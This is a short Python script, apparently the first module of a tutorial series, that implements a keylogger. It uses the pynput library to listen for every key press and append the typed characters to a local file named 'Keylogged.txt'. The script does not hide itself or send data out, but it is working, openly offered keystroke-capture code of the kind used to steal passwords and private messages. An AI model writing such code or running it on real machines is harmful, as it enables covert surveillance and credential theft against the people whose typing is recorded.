#Modular 1 | Keylogger using Python

#Imports: pynput 
from pynput import keyboard


def keyPress(key):
    print(str(key))
    with open("Keylogged.txt", "a") as logKey:
        try:
            char = key.char 
            logKey.write(char)
        except:
            print("Error getting characters")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPress)
    listener.start()
    input()
